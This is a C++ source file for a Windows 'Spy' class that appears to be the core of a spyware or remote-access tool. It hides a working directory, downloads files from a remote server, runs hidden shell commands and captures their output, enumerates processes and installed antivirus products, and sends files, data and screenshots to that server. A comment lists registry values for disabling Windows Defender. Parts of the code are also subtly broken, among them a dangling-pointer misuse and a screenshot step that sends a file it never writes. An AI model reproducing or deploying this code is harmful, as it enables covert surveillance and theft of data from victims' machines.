#include <iostream>
#include <filesystem>
#include <vector>
#include <Windows.h>
#include <shlobj.h>
#include <fstream>
#include <restclient-cpp/restclient.h>
#include <psapi.h>
#include <wbemidl.h>
#include <conio.h>
#include <atlbase.h>
#include <wbemidl.h>
#include <gdiplus.h>


#include "Spy.h"
#include "utils.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment( lib, "gdiplus" )
//#pragma comment(lib, "cmcfg32.lib")

Spy::Spy(std::string server, std::filesystem::path base)
{
	this->base = base;
	this->server = server;
	RestClient::init();

	std::filesystem::create_directory(std::filesystem::path(base.string() + "\\Spy"));
	PCWSTR spyDir = s2ws(std::filesystem::path(base.string() + "\\Spy").string()).c_str();
	SetFileAttributes(spyDir, FILE_ATTRIBUTE_HIDDEN);
}

Spy::~Spy(){}

std::string Spy::GetServer()
{
	return this->server;
}

void Spy::SetServer(std::string server)
{
	this->server = server;
}


bool Spy::S_CreateDir(std::filesystem::path dir, bool hidden)
{

	if (std::filesystem::exists(dir))
	{
		if (hidden)
		{
			LPCWSTR d = s2ws(dir.string()).c_str();
			CreateDirectory(d, NULL);
			SetFileAttributes(d, FILE_ATTRIBUTE_HIDDEN);
			return true;
		}
		else
		{
			return std::filesystem::create_directory(dir);
		}
	}
	else
	{
		return false;
	}
}

bool Spy::S_CreateFile(std::filesystem::path file)
{
	if (std::filesystem::exists(file))
	{
		std::ofstream outfile(file.string());
		if (outfile.good())
		{
			outfile.close();
			return true;
		}
		else {
			return false;
		}
	}
	else
	{
		return false;
	}
}

bool Spy::Download(std::string name, std::string url)
{
	RestClient::Response res = RestClient::get(url);
	if (res.code == 200)
	{
		std::string content = res.body;
		std::string out = this->base.string() + "\\" + name;
		std::ofstream outfile(out);
		if (outfile.good())
		{
			outfile << content;
			outfile.close();
			return true;
		}
		else {
			return false;
		}
	}
	return false;
}

/*
types:

CSIDL_ADMINTOOLS
CSIDL_APPDATA
CSIDL_COMMON_ADMINTOOLS
CSIDL_COMMON_APPDATA
CSIDL_COMMON_DOCUMENTS
CSIDL_COOKIES
CSIDL_FLAG_CREATE
CSIDL_FLAG_DONT_VERIFY
CSIDL_HISTORY
CSIDL_INTERNET_CACHE
CSIDL_LOCAL_APPDATA
CSIDL_MYPICTURES
CSIDL_PERSONAL
CSIDL_PROGRAM_FILES
CSIDL_PROGRAM_FILES_COMMON
CSIDL_SYSTEM
CSIDL_WINDOWS
*/
std::filesystem::path Spy::GetWindowPath(int type)
{
	TCHAR szPath[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPath(NULL,type,NULL,0,szPath)))
	{
		std::wstring temp(&szPath[0]); 
		std::string doc(temp.begin(), temp.end());
		return std::filesystem::path(doc);
	}
	return this->base;
}

std::vector<std::filesystem::directory_entry> Spy::GetFileList(std::filesystem::path location)
{
	std::vector<std::filesystem::directory_entry> list = {};
	for (const std::filesystem::directory_entry& entry : std::filesystem::directory_iterator(location))
	{
		list.push_back(entry);
	}

	return list;
}


/*
SE_ASSIGNPRIMARYTOKEN_NAME	
SE_BACKUP_NAME	
SE_DEBUG_NAME	
SE_INCREASE_QUOTA_NAME
SE_TCB_NAME
*/
bool Spy::RequestAdmin(LPCTSTR privilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken = GetConsoleWindow();

	if (!LookupPrivilegeValue(NULL, privilege, &luid))
	{
		return false;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		return false;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return false;
	}

	return true;
}

/*
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
*/
bool Spy::DisableSecurity()
{
	return true;
}

bool Spy::Execute(std::string cmd)
{
	if ((int)ShellExecuteW(NULL, L"open", s2ws("cmd").c_str(), s2ws("/c " + cmd).c_str(), NULL, SW_HIDE) > 32) 
	{
		return true;
	}
	else {
		return false;
	}
}

std::string Spy::Command(std::string cmd)
{
	std::string file_name = "command.txt";
	std::system((cmd + " > " + file_name).c_str());

	std::ifstream file(file_name);
	std::string res = { std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>() };
	file.close();
	try
	{
		std::filesystem::remove(file_name);
	}
	catch (const std::exception&){}
	return res;
}

std::vector<std::string> Spy::ListProcess()
{
	std::vector<std::string> list = {};

	try
	{
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			return list;
		}
		else
		{
			cProcesses = cbNeeded / sizeof(DWORD);
			for (int i = 0; i < cProcesses; i++)
			{
				if (aProcesses[i] != 0)
				{
					WCHAR szProcessName[MAX_PATH] = L"";
					static int a;
					HMODULE hMod;
					DWORD cbNeeded;
					HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
					if (hProcess != NULL)
					{
						if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
						{
							GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(WCHAR));
						}
					}
					std::wstring ws(szProcessName);
					std::string str(ws.begin(), ws.end());
					str += " " + std::to_string(aProcesses[i]);
					list.push_back(str);
					a++;
					CloseHandle(hProcess);
				}
			}
		}
	}
	catch (const std::exception& e)
	{
		std::cout << e.what() << std::endl;
		std::cin.get();
	}
	return list;
}

std::vector<std::string> Spy::ListAntiVirus()
{
	CoInitializeEx(NULL, NULL);
	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
	IWbemLocator* locator = 0;
	CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&locator);
	IWbemServices* services = 0;
	std::vector<std::string> list = {};

	const wchar_t* name = s2ws("root\\SecurityCenter2").c_str();
	
	if (locator->ConnectServer(CComBSTR(name).Detach(), 0, 0, 0, 0, 0, 0, &services)) {
		CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
		const wchar_t* query = s2ws("Select * From AntiVirusProduct").c_str();


		IEnumWbemClassObject* e = 0;
		if (services->ExecQuery(CComBSTR("WQL").Detach(), CComBSTR(query).Detach(), WBEM_FLAG_FORWARD_ONLY, 0, &e)) {
			IWbemClassObject* object = 0;
			ULONG u = 0;

			std::string antiVirus;

			while (e) {
				e->Next(WBEM_INFINITE, 1, &object, &u);
				if (!u) break;
				CComVariant cvtVersion;
				object->Get(L"displayName", 0, &cvtVersion, 0, 0);
				std::wstring ws(cvtVersion.bstrVal);
				std::string str(ws.begin(), ws.end());
				list.push_back(str);
			}
		}
	}
	services->Release();
	locator->Release();
	CoUninitialize();
	_getch();

	return list;
}

std::string Spy::RequestServer()
{
	RestClient::Response res = RestClient::get(this->server);
	return res.body;
}

RestClient::Response Spy::SendInformation(std::string data)
{
	return RestClient::get(this->server +"?data="+ url_encode(data));
}

RestClient::Response Spy::SendFile(std::string contenttype,std::filesystem::path file)
{
	std::string data = "";
	std::ifstream f(file.string());
	if (f.is_open())
	{
		std::string line = "";
		while (std::getline(f, line))
		{
			data += line + "\n";
		}
		f.close();
	}
	return RestClient::get(this->server + "?type=" + contenttype + "&data=" +url_encode(data));
}

int Spy::GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
	using namespace Gdiplus;
	UINT  num = 0;
	UINT  size = 0;

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);
	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return 0;
}

RestClient::Response Spy::SendScreenShot()
{

	IStream* istream;
	HRESULT res = CreateStreamOnHGlobal(NULL, true, &istream);
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	{
		HDC scrdc, memdc;
		HBITMAP membit;
		scrdc = ::GetDC(0);
		int Height = GetSystemMetrics(SM_CYSCREEN);
		int Width = GetSystemMetrics(SM_CXSCREEN);
		memdc = CreateCompatibleDC(scrdc);
		membit = CreateCompatibleBitmap(scrdc, Width, Height);
		HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
		BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);

		Gdiplus::Bitmap bitmap(membit, NULL);
		CLSID clsid;
		this->GetEncoderClsid(L"image/jpeg", &clsid);
		bitmap.Save(istream, &clsid, NULL);

		DeleteObject(memdc);
		DeleteObject(membit);
		::ReleaseDC(0, scrdc);
	}
	Gdiplus::GdiplusShutdown(gdiplusToken);
	istream->Release();

	return this->SendFile("image/jpeg", std::filesystem::path("./image"));
}